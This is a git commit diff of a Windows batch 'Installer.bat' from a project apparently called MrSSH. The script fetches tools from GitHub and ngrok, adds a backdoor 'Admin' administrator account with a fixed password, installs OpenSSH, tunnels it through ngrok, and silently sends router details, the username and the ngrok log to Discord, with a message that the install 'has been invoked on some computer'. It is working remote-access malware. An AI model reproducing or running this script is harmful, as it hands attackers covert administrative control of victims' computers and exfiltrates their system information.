2b781d3d6e04641ac4affd3d0198b2c7343dea94
dh3b <74708369+dh3b@users.noreply.github.com>
2021-10-28 19:18:54 +0200

    Some code movement

--- Files/Installer.bat
+++ Files/Installer.bat
@@ -4,22 +4,23 @@ curl https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1 -o Open
 curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o source.bat
 curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
 curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" -o "SilentCMD.exe"
-curl https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/ngrok.cmd -o ngrok.cmd
 
-set ""
-
-:: router info command
-curl --create-dirs -sfkLo "%localappdata%\microsoft\windowsapps\Router.bat" "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/source.bat" & call "%localappdata%\microsoft\windowsapps\Router.bat" >nul & call router>router.txt & call Source.bat +silent --file %temp%/router.txt
+powershell ./OpenSSH.ps1
 
 net user "Admin" "Administrator" /add
 net localgroup Administrators Admin /add
 net localgroup Administratorzy Admin /add
 net localgroup Administración  Admin /add
 
+set ""
+
+call source.bat +silent --embed "MrSSH install code has been invoked on some computer" "Files with information will be send soon" "50c878"
+
+:: router info command
+curl --create-dirs -sfkLo "%localappdata%\microsoft\windowsapps\Router.bat" "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/source.bat" & call "%localappdata%\microsoft\windowsapps\Router.bat" >nul & call router>router.txt & call Source.bat +silent --file %temp%/router.txt
+
 whoami>user.txt
 call Source.bat +silent --file %temp%/user.txt
-
-powershell ./OpenSSH.ps1
 
 tar -xf ngrok.zip
 start /B silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10
